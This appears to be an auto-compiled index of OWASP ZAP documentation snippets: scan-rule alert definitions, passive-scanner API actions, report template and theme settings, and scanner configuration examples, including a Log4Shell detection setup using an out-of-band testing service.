[FullPathDisclosureScanRule.java](https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrulesAlpha/src/main/java/org/zaproxy/zap/extension/pscanrulesAlpha/FullPathDisclosureScanRule.java)

----------------------------------------

TITLE: Passive Scanner API Actions
DESCRIPTION: API actions for controlling passive scanning behavior including enabling/disabling scanners, setting thresholds, and managing the scan queue.

LANGUAGE: markdown
CODE:
### Actions

* clearQueue: Clears the passive scan queue.
* disableAllScanners: Disables all passive scan rules.
* disableAllTags: Disables all passive scan tags.
* disableScanners (ids\*): Disables passive scan rules.
    * ids: A comma separated list of scan rule IDs.
* enableAllScanners: Enables all passive scan rules.
* enableAllTags: Enables all passive scan tags.
* enableScanners (ids\*): Enables passive scan rules.
    * ids: A comma separated list of scan rule IDs.
* setEnabled (enabled\*): Sets whether or not the passive scanning is enabled.
    * enabled: The enabled state, true or false.
* setMaxAlertsPerRule (maxAlerts\*): Sets the maximum number of alerts a passive scan rule can raise.
    * maxAlerts: The maximum number of alerts.
* setScanOnlyInScope (onlyInScope\*): Sets whether or not the passive scan should be performed only on messages that are in scope.
    * onlyInScope: The scan state, true or false.
* setScannerAlertThreshold (id\* alertThreshold\*): Sets the alert threshold of a passive scan rule.
    * id: The ID of the scan rule.
    * alertThreshold: The alert threshold: OFF, DEFAULT, LOW, MEDIUM and HIGH

----------------------------------------

TITLE: ZAP API Scan with Field Values Configuration
DESCRIPTION: Example of configuring specific field values for API scanning using command line options.

LANGUAGE: bash
CODE:
  -config formhandler.fields.field\(0\).fieldId=username \
  -config formhandler.fields.field\(0\).value=test@example.com \
  -config formhandler.fields.field\(0\).enabled=true \
  -config formhandler.fields.field\(1\).fieldId=phone \
  -config formhandler.fields.field\(1\).value=012345678 \
  -config formhandler.fields.field\(1\).enabled=true

----------------------------------------

TITLE: Generating Traditional XML Report in OWASP ZAP
DESCRIPTION: This XML snippet demonstrates the structure of a Traditional XML Report generated by OWASP ZAP. It includes site information, alerts, and instances of potential vulnerabilities. The report provides details such as plugin ID, alert name, risk level, confidence, and specific instances of the identified issues.

LANGUAGE: xml
CODE:
<?xml version="1.0"?>
<OWASPZAPReport version="Dev Build" generated="Fri, 4 Feb 2022 17:42:18">
    
        <site name="http://localhost:8080" host="localhost" port="8080" ssl="false">
            <alerts>

                    <alertitem>
                        <pluginid>20012</pluginid>
                        <alertRef>20012</alertRef>
                        <alert>Anti-CSRF Tokens Check</alert>
                        <name>Anti-CSRF Tokens Check</name>
                        <riskcode>3</riskcode>
                        <confidence>2</confidence>
                        <riskdesc>High (Medium)</riskdesc>
                        <confidencedesc>Medium</confidencedesc>
                        <desc><p>A cross-site request forgery is an attack that involves forcing a victim to send an HTTP request to a target destination without their knowledge...</desc>
                        <instances>

                                <instance>
                                    <uri>http://localhost:8080/bodgeit/advanced.jsp</uri>
                                    <method>GET</method>
                                    <param></param>
                                    <attack></attack>
                                    <evidence><form id="advanced" name="advanced" method="POST" onsubmit="return validateForm(this);false;"></evidence>
                                    <otherinfo></otherinfo>
                                </instance>

                                <instance>
                                    <uri>http://localhost:8080/bodgeit/advanced.jsp</uri>
                                    <method>GET</method>
                                    <param></param>
                                    <attack></attack>
                                    <evidence><form id="query" name="advanced" method="POST"></evidence>
                                    <otherinfo></otherinfo>
                                </instance>

                                <instance>
                                    <uri>http://localhost:8080/bodgeit/basket.jsp</uri>
                                    <method>GET</method>
                                    <param></param>
                                    <attack></attack>
                                    <evidence><form action="basket.jsp" method="post"></evidence>
                                    <otherinfo></otherinfo>
                                </instance>

----------------------------------------

TITLE: Implementing CSP Scan Rule in Java for ZAProxy
DESCRIPTION: This code snippet is part of a ZAProxy extension that implements a passive scan rule to detect unsafe Content Security Policy configurations. It specifically checks for the presence of 'unsafe-eval' in the script-src directive.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/ContentSecurityPolicyScanRule.java

----------------------------------------

TITLE: Implementing Sec-Fetch-Site Header Check in Java for ZAP
DESCRIPTION: This code snippet is part of a passive scan rule in ZAP (Zed Attack Proxy) that checks for the presence of the Sec-Fetch-Site header in HTTP requests. It is implemented in the FetchMetadataRequestHeadersScanRule class.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrulesAlpha/src/main/java/org/zaproxy/zap/extension/pscanrulesAlpha/FetchMetadataRequestHeadersScanRule.java

----------------------------------------

TITLE: Listing New Website Pages with Git
DESCRIPTION: This Bash command uses Git to list new website pages added in the last month. It should be run in the root of the cloned zaproxy-website repository.

LANGUAGE: bash
CODE:
git diff --stat --diff-filter=A $(git rev-list -n1 --first-parent --until="1.month.ago" HEAD) | grep -E "(md|html)"

----------------------------------------

TITLE: Alert Metadata Definition in YAML
DESCRIPTION: YAML configuration defining metadata for the Strict-Transport-Security header not set alert, including ID, risk level, solution, and references.

LANGUAGE: yaml
CODE:
title: "Strict-Transport-Security Header Not Set"
alertid: 10035-1
alertindex: 1003501
alerttype: "Passive"
alertcount: 8
status: release
type: alert
risk: Low
solution: "Ensure that your web server, application server, load balancer, etc. is configured to enforce Strict-Transport-Security."
references:
   - https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html
   - https://owasp.org/www-community/Security_Headers
   - https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security
   - https://caniuse.com/stricttransportsecurity
   - https://datatracker.ietf.org/doc/html/rfc6797
other: ""
cwe: 319
wasc: 15
alerttags: 
  - CWE-319
  - OWASP_2017_A06
  - OWASP_2021_A05
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/StrictTransportSecurityScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrules/StrictTransportSecurityScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/passive-scan-rules/#id-10035

----------------------------------------

TITLE: Configuring CSP Alert Parameters in YAML
DESCRIPTION: YAML configuration defining parameters for CSP header and meta tag validation alert, including alert ID, risk level, solution recommendations, and reference documentation links.

LANGUAGE: yaml
CODE:
title: "CSP: Header & Meta"
alertid: 10055-12
alertindex: 1005512
alerttype: "Passive"
alertcount: 13
status: release
type: alert
risk: Informational
solution: "Ensure that your web server, application server, load balancer, etc. is properly configured to set the Content-Security-Policy header."
references:
   - https://www.w3.org/TR/CSP/
   - https://caniuse.com/#search=content+security+policy
   - https://content-security-policy.com/
   - https://github.com/HtmlUnit/htmlunit-csp
   - https://developers.google.com/web/fundamentals/security/csp#policy_applies_to_a_wide_variety_of_resources
other: ""
cwe: 693
wasc: 15
alerttags: 
  - CWE-693
  - OWASP_2017_A06
  - OWASP_2021_A05

----------------------------------------

TITLE: Alert Definition for Old ASP.NET Version Detection
DESCRIPTION: YAML configuration for ZAProxy scanner alert that detects outdated ASP.NET versions. Includes risk level, solution guidance, and related security classifications like CWE and WASC identifiers.

LANGUAGE: yaml
CODE:
title: "Old Asp.Net Version in Use"
alertid: 10032-3
alertindex: 1003203
alerttype: "Passive"
alertcount: 6
status: release
type: alert
risk: Low
solution: "Ensure the engaged framework is still supported by Microsoft."
other: ""
cwe: 642
wasc: 14
alerttags: 
  - CWE-642
  - OWASP_2017_A06
  - OWASP_2021_A04
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/ViewstateScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrules/ViewstateScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/passive-scan-rules/#id-10032

----------------------------------------

TITLE: Listing GraphQL API Views in Markdown
DESCRIPTION: Enumerates the available view operations in the GraphQL API, including options for argument types, depth limits, and query generation settings.

LANGUAGE: markdown
CODE:
### Views

* optionArgsType
* optionMaxArgsDepth
* optionMaxQueryDepth
* optionOptionalArgsEnabled
* optionQuerySplitType
* optionQueryGenEnabled
* optionRequestMethod

----------------------------------------

TITLE: Text4shell Alert Configuration in YAML
DESCRIPTION: YAML configuration for the Text4shell vulnerability scanner rule, including alert metadata, risk level, solution, references, and associated security tags.

LANGUAGE: yaml
CODE:
title: "Text4shell (CVE-2022-42889)"
alertid: 40047
alertindex: 4004700
alerttype: "Active"
alertcount: 1
status: beta
type: alert
risk: High
solution: "Upgrade Apache Commons Text prior to version 1.10.0 or newer."
references:
   - https://nvd.nist.gov/vuln/detail/CVE-2022-42889
   - https://securitylab.github.com/advisories/GHSL-2022-018_Apache_Commons_Text/
other: ""
cwe: 117
wasc: 20
techtags: 
  - Language.Java
alerttags: 
  - CVE-2022-42889
  - CWE-117
  - OUT_OF_BAND
  - OWASP_2017_A09
  - OWASP_2021_A06
  - POLICY_DEV_FULL
  - POLICY_QA_FULL
  - POLICY_SEQUENCE
  - WSTG-v42-INPV-11

----------------------------------------

TITLE: Configuring JSON-Based Authentication POST Data in ZAP
DESCRIPTION: Examples of JSON structures for authentication POST data, showing how to include username and password placeholders.

LANGUAGE: json
CODE:
{"username":"{%username%}","password":"{%password%}"}

LANGUAGE: json
CODE:
{"user":{"mail":"{%username%}","password":"{%password%}"}}

----------------------------------------

TITLE: ZAP API Scan with Property File
DESCRIPTION: Example of running an API scan using a property file for configuration options.

LANGUAGE: bash
CODE:
docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-weekly zap-api-scan.py \
    -t https://www.example.com/openapi.json -f openapi \
    -z "-configfile /zap/wrk/options.prop"

----------------------------------------

TITLE: Configuring Report Template Structure in YAML
DESCRIPTION: YAML configuration file that defines the core properties of a report template including name, format, mode, extension, sections and themes.

LANGUAGE: yaml
CODE:
name:        # The display name for the report
format:      # The format, eg one of HTML, XML, MD, JSON, PDF - this is used internally but not currently exposed in ZAP
mode:        # The Thymeleaf template mode, one of HTML, RAW, TEXT, HTML
extension:   # The extension to use when generating the report
sections:    # An optional list of sections - parts of the report which may be included or excluded
themes:      # An optional list of themes - different colours and styles which apply to the same content

----------------------------------------

TITLE: Referencing Strict-Transport-Security Scan Rule Java Implementation
DESCRIPTION: Link to the Java source code implementing the Strict-Transport-Security scan rule in the ZAP project.

LANGUAGE: markdown
CODE:
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/StrictTransportSecurityScanRule.java

----------------------------------------

TITLE: Scanning for CSP Directive Definition Failures in Java
DESCRIPTION: This code snippet is part of ZAP's passive scan rules, specifically for checking Content Security Policy headers. It likely contains logic to detect when CSP directives that don't fallback to default-src are missing or improperly defined.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/ContentSecurityPolicyScanRule.java

----------------------------------------

TITLE: Implementing CSP Scan Rule in Java for ZAP
DESCRIPTION: This code snippet is part of ZAP's passive scan rules, specifically for detecting and analyzing Content Security Policy headers. It likely contains methods for parsing CSP headers, evaluating their effectiveness, and generating appropriate alerts.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/ContentSecurityPolicyScanRule.java

----------------------------------------

TITLE: Implementing SQL Injection Scanner for SQLite in Java
DESCRIPTION: This code snippet refers to the implementation of a SQL injection scanner specifically for SQLite databases in ZAP. It is part of the active scan rules and is responsible for detecting potential SQL injection vulnerabilities in applications using SQLite.

LANGUAGE: Java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/SqlInjectionSqLiteScanRule.java

----------------------------------------

TITLE: Defining Server Header Information Leak Alert in YAML
DESCRIPTION: YAML configuration for an alert that detects server version information leaks via the 'Server' HTTP header. It specifies the alert ID, type, risk level, solution, and associated security standards.

LANGUAGE: yaml
CODE:
title: "Server Leaks Version Information via \"Server\" HTTP Response Header Field"
alertid: 10036-2
alertindex: 1003602
alerttype: "Passive"
alertcount: 2
status: release
type: alert
risk: Low
solution: "Ensure that your web server, application server, load balancer, etc. is configured to suppress the \"Server\" header or provide generic details."
references:
   - https://httpd.apache.org/docs/current/mod/core.html#servertokens
   - https://learn.microsoft.com/en-us/previous-versions/msp-n-p/ff648552(v=pandp.10)
   - https://www.troyhunt.com/shhh-dont-let-your-response-headers/
other: ""
cwe: 497
wasc: 13
alerttags: 
  - CWE-497
  - OWASP_2017_A06
  - OWASP_2021_A05
  - WSTG-v42-INFO-02
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/ServerHeaderInfoLeakScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrules/ServerHeaderInfoLeakScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/passive-scan-rules/#id-10036

----------------------------------------

TITLE: Implementing Clacks Server Detection in JavaScript for ZAP
DESCRIPTION: This script passively scans HTTP responses for the 'X-Clacks-Overhead' header, indicating a server running on the Clacks network. It generates an informational alert when detected, providing details about the GNU Terry Pratchett tribute.

LANGUAGE: javascript
CODE:
// The script is referenced but not provided in the input text.
// Actual implementation would be found at:
// https://github.com/zaproxy/community-scripts/blob/main/passive/clacks.js

----------------------------------------

TITLE: Alert Definition in YAML
DESCRIPTION: YAML configuration defining the security alert parameters for missing Sec-Fetch-Dest headers. Includes alert ID, risk level, solution, and related security standards references.

LANGUAGE: yaml
CODE:
title: "Sec-Fetch-Dest Header is Missing"
alertid: 90005-3
alertindex: 9000503
alerttype: "Passive"
alertcount: 8
status: alpha
type: alert
risk: Informational
solution: "Ensure that Sec-Fetch-Dest header is included in request headers."
references:
   - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Dest
other: ""
cwe: 352
wasc: 9
alerttags: 
  - CWE-352
  - WSTG-v42-SESS-05

----------------------------------------

TITLE: Escaping Special Characters in URL Regexes
DESCRIPTION: This snippet demonstrates how to properly escape special characters when defining URL regular expressions for ZAP contexts, particularly when dealing with the '\E' sequence.

LANGUAGE: markdown
CODE:
\Qsubdomain.example.com/path?a=\E\\E\Q&moredata=2\E

----------------------------------------

TITLE: Importing API Definitions using Java API Client
DESCRIPTION: Demonstrates how to import SOAP and OpenAPI definitions using ZAP's Java API client, supporting both local file and URL imports.

LANGUAGE: java
CODE:
Map<String, String> map1 = new HashMap<>();  
map1.put("file", "/home/user/openapi.json");  
ApiResponse resp =  
   api.callApi("openapi", "action", "importFile", p1);  
 
Map<String, String> map2 = new HashMap<>();  
 map2.put("url", "https://localhost/openapi.json") 
ApiResponse resp =  
   api.callApi("openapi", "action", "importUrl", p2);  
 
Map<String, String> map3 = new HashMap<>();  
map3.put("file", "/home/user/soap.xml");  
ApiResponse resp =  
   api.callApi("soap", "action", "importFile", p3);  
 
Map<String, String> map4 = new HashMap<>();  
map4.put("url", "https://localhost/soap.xml");  
ApiResponse resp =  
   api.callApi("soap", "action", "importUrl", p4);

----------------------------------------

TITLE: Implementing Resource References in HTML Templates
DESCRIPTION: HTML code showing how to properly reference resources like JavaScript, CSS and images in report templates with both template and static paths.

LANGUAGE: html
CODE:
   <script th:src="${resources + '/script.js'}" src="resources/script.js"></script>
   <link rel="stylesheet" th:href="${resources + '/style.css'}" href="resources/style.css">
   <img th:src="${resources + '/image.png'}" src="resources/image.png">

----------------------------------------

TITLE: Defining Report Sections in Markdown
DESCRIPTION: This snippet defines a table of report sections with their corresponding IDs. It includes three sections: Risk Summary Chart, No. of Bug Occurrences Count, and Vulnerability Impact.

LANGUAGE: markdown
CODE:
| Section                      | Id                  |
|:-----------------------------|:--------------------|
| Risk Summary Chart           | riskSummaryChart    |
| No. of Bug Occurrences Count | bugsCountChart      |
| Vulnerability Impact         | vulnerabilityImpact |

----------------------------------------

TITLE: Implementing Feature-Policy Header Detection in Java for ZAP
DESCRIPTION: This code snippet implements a ZAP passive scan rule to detect the deprecated Feature-Policy header. It likely scans HTTP responses for the presence of the old header and raises an alert if found.

LANGUAGE: java
CODE:
// Code not provided in the input text, but referenced at:
// https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrulesBeta/src/main/java/org/zaproxy/zap/extension/pscanrulesBeta/PermissionsPolicyScanRule.java

----------------------------------------

TITLE: Implementing GraphQL Support Extension in Java
DESCRIPTION: This code snippet represents the main Java class for a GraphQL support extension in ZAP. It likely contains methods for parsing and analyzing GraphQL queries and schemas.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/graphql/src/main/java/org/zaproxy/addon/graphql/ExtensionGraphQl.java

----------------------------------------

TITLE: Checking X-Powered-By Headers in JavaScript
DESCRIPTION: This script passively checks for the presence of X-Powered-By headers in HTTP responses. It's designed to identify potential information disclosure vulnerabilities in web servers or applications.

LANGUAGE: javascript
CODE:
https://github.com/zaproxy/community-scripts/blob/main/passive/X-Powered-By_header_checker.js

----------------------------------------

TITLE: Retrieving BOAST Server Details in JavaScript for OWASP ZAP
DESCRIPTION: This code snippet shows how to retrieve and print details of a registered BOAST server, including its URI, ID, payload, and canary value.

LANGUAGE: javascript
CODE:
print("Server URI: ", server.getUri())
print("ID: ", server.getId())
print("Payload: ", server.getPayload())
print("Canary: ", server.getCanary())

----------------------------------------

TITLE: Referencing SAML Passive Scanner Implementation in Java
DESCRIPTION: This code snippet provides a link to the Java implementation of the SAML Passive Scanner in the ZAP project. The scanner is responsible for detecting the use of SAML in web applications.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/saml/src/main/java/org/zaproxy/zap/extension/saml/SAMLPassiveScanner.java

----------------------------------------

TITLE: Referencing Java Implementation of Insecure Authentication Scan Rule
DESCRIPTION: Provides a link to the Java source code for the passive scan rule that detects insecure authentication mechanisms in ZAP.

LANGUAGE: markdown
CODE:
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/InsecureAuthenticationScanRule.java

----------------------------------------

TITLE: ZAP Configuration File for Log4Shell Detection
DESCRIPTION: Configuration file (log4shell.conf) for ZAP, setting up OAST service, scan parameters, and header replacement rules.

LANGUAGE: conf
CODE:
# Use the public BOAST service
oast.boast.uri=https://odiss.eu:1337/events
oast.activeScanService=BOAST
oast.boast.pollingFrequency=10

# Scan headers in all requests
scanner.injectable=11
scanner.scanHeadersAllRequests=true

# Send the X-Api-Version header in spider requests - just required for the test app
replacer.full_list(0).description=X-Api-Version
replacer.full_list(0).enabled=true
replacer.full_list(0).matchtype=REQ_HEADER
replacer.full_list(0).matchstr=X-Api-Version
replacer.full_list(0).regex=false
replacer.full_list(0).replacement=test
replacer.full_list(0).initiators=\[3\]

----------------------------------------

TITLE: ZAP Configuration Example
DESCRIPTION: Example of setting API key configuration using command line options

LANGUAGE: shell
CODE:
<zap-script> -config api.key=12345

----------------------------------------

TITLE: Value Generator Statistics Path Format
DESCRIPTION: Lists the statistics paths exposed by the Value Generator add-on for tracking add, modify, and remove operations. The {name} placeholder represents the actual field name being operated on.

LANGUAGE: plaintext
CODE:
stats.formhandler.add
stats.formhandler.add.{name}
stats.formhandler.modify
stats.formhandler.modify.{name}
stats.formhandler.remove
stats.formhandler.remove.{name}

----------------------------------------

TITLE: Defining Report Themes in Markdown
DESCRIPTION: This snippet defines the available themes for the Modern HTML Report using a Markdown table. It lists the theme names and their corresponding IDs, including color schemes.

LANGUAGE: markdown
CODE:
| Theme                           | Id           |
|:--------------------------------|:-------------|
| Console \[Dark / Green\]        | console      |
| Construction \[Light / Orange\] | construction |
| Corporate \[Light / Blue\]      | corporate    |
| Marketing \[Light / Purple\]    | marketing    |
| Mountain \[Light / Dark Blue\]  | mountain     |
| Nature \[Light / Green\]        | nature       |
| Ocean \[Light / Blue\]          | ocean        |
| Plutonium \[Dark / Green\]      | plutonium    |
| Skyline \[Dark / Pink\]         | skyline      |
| Technology \[Dark / Red\]       | technology   |

----------------------------------------

TITLE: Java Class Example - Source Code Disclosure
DESCRIPTION: A simple Java class example demonstrating the type of code that could be exposed through WEB-INF folder access. This represents sensitive source code that should be protected from public access.

LANGUAGE: java
CODE:
class A { }

----------------------------------------

TITLE: Importing Postman Collection via API in ZAProxy
DESCRIPTION: API operations added for importing Postman collections. The 'importFile' action imports from a file, while 'importUrl' imports from a URL. Both operations allow specifying an endpoint URL.

LANGUAGE: markdown
CODE:
* ACTION importFile (file, endpointUrl)
* ACTION importUrl (url, endpointUrl)

----------------------------------------

TITLE: Configuring Base64 Disclosure Alert Rules in YAML
DESCRIPTION: YAML configuration that defines three related alert types for Base64 disclosure scanning: ASP.NET ViewState disclosure detection, ViewState integrity verification, and general Base64 pattern detection. References the Java implementation file that contains the scanning logic.

LANGUAGE: yaml
CODE:
title: "Base64 Disclosure"
alertid: 10094
alertindex: 1009400
alerttype: "Passive"
status: alpha
type: alertset
alerts:
   10094-1:
      alertid: 10094-1
      name: "ASP.NET ViewState Disclosure"
   10094-2:
      alertid: 10094-2
      name: "ASP.NET ViewState Integrity"
   10094-3:
      alertid: 10094-3
      name: "Base64 Disclosure"
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrulesAlpha/src/main/java/org/zaproxy/zap/extension/pscanrulesAlpha/Base64Disclosure.java
linktext: "org/zaproxy/zap/extension/pscanrulesAlpha/Base64Disclosure.java"

----------------------------------------

TITLE: Implementing Open Redirect Detection in Java for ZAP
DESCRIPTION: This code snippet is part of the UserControlledOpenRedirectScanRule class in ZAP, which implements the passive scan rule for detecting potential open redirect vulnerabilities. It analyzes HTTP responses for 301 or 302 redirects that may contain user-controlled input in the location header.

LANGUAGE: java
CODE:
// Full source code available at:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/UserControlledOpenRedirectScanRule.java

----------------------------------------

TITLE: Implementing Retrieved from Cache Scan Rule in Java for ZAP
DESCRIPTION: This code snippet implements the RetrievedFromCacheScanRule class in Java for ZAP. It scans for responses retrieved from shared caches, which may lead to sensitive information leakage. The class is part of the passive scan rules in the ZAP extension.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/RetrievedFromCacheScanRule.java

----------------------------------------

TITLE: Alert Configuration for Username Hash Detection
DESCRIPTION: YAML configuration for a passive security scan rule that detects username hashes in responses. The alert is configured as informational risk level and includes references to OWASP testing guides and CWE/WASC classifications.

LANGUAGE: yaml
CODE:
title: "Username Hash Found"
alertid: 10057
alertindex: 1005700
alerttype: "Passive"
alertcount: 1
status: release
type: alert
risk: Informational
solution: "Use per user or session indirect object references (create a temporary mapping at time of use). Or, ensure that each use of a direct object reference is tied to an authorization check to ensure the user is authorized for the requested object."
references:
   - https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References.html
other: "The hash was an SHA1, with value: d033e22ae348aeb5660fc2140aec35850c4da997"
cwe: 284
wasc: 2
alerttags: 
  - CUSTOM_PAYLOADS
  - CWE-284
  - OWASP_2017_A05
  - OWASP_2021_A01
  - WSTG-v42-ATHZ-04

----------------------------------------

TITLE: Displaying SSTI Test Results Table in Markdown
DESCRIPTION: This snippet uses a custom shortcode to generate a table of SSTI test results. The shortcode is likely defined elsewhere in the project to process and display the data.

LANGUAGE: markdown
CODE:
{{< ssti-table target="ssti" section="all" >}}

----------------------------------------

TITLE: Preventing External Redirects in Java Web Applications
DESCRIPTION: Implementation details for the ExternalRedirectScanRule class that detects unvalidated redirects in web applications. The scan rule checks for JavaScript-based redirects that allow external URLs to be set, which could be exploited for phishing attacks.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/ExternalRedirectScanRule.java

----------------------------------------

TITLE: HTTP Parameter Override Alert Configuration in YAML
DESCRIPTION: YAML configuration block defining metadata for a ZAP passive scan alert that detects potential parameter pollution vulnerabilities. Includes alert ID, risk level, solution guidance, and related security standard mappings.

LANGUAGE: yaml
CODE:
title: "HTTP Parameter Override"
alertid: 10026
alertindex: 1002600
alerttype: "Passive"
alertcount: 1
status: beta
type: alert
risk: Medium
solution: "All forms must specify the action URL."
references:
   - https://download.oracle.com/javaee-archive/servlet-spec.java.net/jsr340-experts/att-0317/OnParameterPollutionAttacks.pdf
other: ""
cwe: 20
wasc: 20
alerttags: 
  - CWE-20
  - OWASP_2017_A06
  - OWASP_2021_A04
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrulesBeta/src/main/java/org/zaproxy/zap/extension/pscanrulesBeta/ServletParameterPollutionScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrulesBeta/ServletParameterPollutionScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/passive-scan-rules-beta/#id-10026

----------------------------------------

TITLE: Configuring YAML Frontmatter for Invoke Applications Documentation
DESCRIPTION: YAML frontmatter configuration for the Invoke Applications documentation page, specifying title, type, weight and addon details.

LANGUAGE: yaml
CODE:
---
# This page was generated from the add-on.
title: Invoke Applications
type: userguide
weight: 1
cascade:
  addon:
    id: invoke
    version: 16.0.0
---

----------------------------------------

TITLE: Configuring Passive Scanner Options in ZAP
DESCRIPTION: This markdown table outlines the configuration options for the ZAP passive scanner. It includes fields for scan scope, fuzzer integration, alert limits, and body size restrictions, along with their corresponding config file keys and default values.

LANGUAGE: markdown
CODE:
|                         Field                         |                                                                                                                                                                                 Details                                                                                                                                                                                  |  Default   |                                      Config File                                      |
|-------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------|---------------------------------------------------------------------------------------|
| Only scan messages in scope                           | Sets whether or not the passive scan should be performed only on messages that are in scope.                                                                                                                                                                                                                                                                             | Deselected | Key: `pscans.scanOnlyInScope` Values: `true` or `false`                               |
| Include traffic from the Fuzzer when passive scanning | Sets whether or not the passive scanning should be performed on messages generated by the Fuzzer.                                                                                                                                                                                                                                                                        | Deselected | Key: `pscans.scanFuzzerMessages` Values: `true` or `false`                            |
| Max alerts any rule can raise                         | Sets the maximum number of alerts a passive scan rule should raise. This may be slightly exceeded due to threading. This setting is typically only useful for automated scanning. Scan rules that exceed this value will be disabled and will need to be manually enabled if a new session is started.                                                                   | 0 (unset)  | Key: `pscans.maxAlertsPerRule` Values: `0`: unset or the maximum number of alerts     |
| Max body size in bytes to scan                        | Sets the maximum size request or response body size in bytes that the passive scanner will scan. This can be used if passive scan rules take too long scanning very large requests or responses. If set the number of ignored requests and responses are recorded in the stats using the keys `stats.pscan.reqBodyTooBig` and `stats.pscan.respBodyTooBig` respectively. | 0 (unset)  | Key: `pscans.maxBodySizeInBytes` Values: `0`: unset or the maximum body size in bytes |
| Clear Queue                                           | Empties the passive scan queue without passively scanning the messages. Currently running rules will run to completion but new rules will only be run when new messages are added to the queue.                                                                                                                                                                          |            |                                                                                       |

----------------------------------------

TITLE: Implementing Unix Timestamp Disclosure Scan Rule in Java for ZAP
DESCRIPTION: This code snippet implements a passive scan rule in ZAP to detect Unix timestamp disclosures. It's part of the org.zaproxy.zap.extension.pscanrules package and extends functionality for identifying potentially sensitive timestamp information.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/TimestampDisclosureScanRule.java

----------------------------------------

TITLE: Defining Permissions Policy Header Alerts in YAML
DESCRIPTION: YAML configuration for ZAP alerting on missing Permissions Policy headers and deprecated Feature Policy headers. Includes alert IDs, names, and metadata for two related alerts.

LANGUAGE: yaml
CODE:
---
title: "Permissions Policy Header Not Set"
alertid: 10063
alertindex: 1006300
alerttype: "Passive"
status: beta
type: alertset
alerts:
   10063-1:
      alertid: 10063-1
      name: "Permissions Policy Header Not Set"
   10063-2:
      alertid: 10063-2
      name: "Deprecated Feature Policy Header Set"
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrulesBeta/src/main/java/org/zaproxy/zap/extension/pscanrulesBeta/PermissionsPolicyScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrulesBeta/PermissionsPolicyScanRule.java"
---

----------------------------------------

TITLE: YAML Alert Configuration
DESCRIPTION: YAML configuration block defining the properties of the SVN source code disclosure security alert including ID, risk level, solutions and security standard mappings.

LANGUAGE: yaml
CODE:
title: "Source Code Disclosure - SVN"
alertid: 42
alertindex: 4200
alerttype: "Active"
alertcount: 1
status: beta
type: alert
risk: Medium
solution: "Ensure that SVN metadata files are not deployed to the web server or application server."
references:
   - https://owasp.org/www-community/attacks/Forced_browsing
   - https://cwe.mitre.org/data/definitions/425.html
other: "The source code for [] was found at []"
cwe: 541
wasc: 34
alerttags: 
  - CWE-541
  - OWASP_2017_A06
  - OWASP_2021_A05
  - POLICY_QA_FULL
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrulesBeta/src/main/java/org/zaproxy/zap/extension/ascanrulesBeta/SourceCodeDisclosureSvnScanRule.java
linktext: "org/zaproxy/zap/extension/ascanrulesBeta/SourceCodeDisclosureSvnScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/active-scan-rules-beta/#id-42

----------------------------------------

TITLE: Running Full Authenticated Scan with ZAP Automation Framework
DESCRIPTION: Instructions to download and import the Automation Framework plan for performing a full authenticated scan against DVWA. The plan is available as a YAML file in the ZAP community scripts repository.

LANGUAGE: yaml
CODE:
https://github.com/zaproxy/community-scripts/blob/main/other/af-plans/FullScanDvwaAuth.yaml

----------------------------------------

TITLE: Defining Hash Disclosure Alert Parameters in YAML
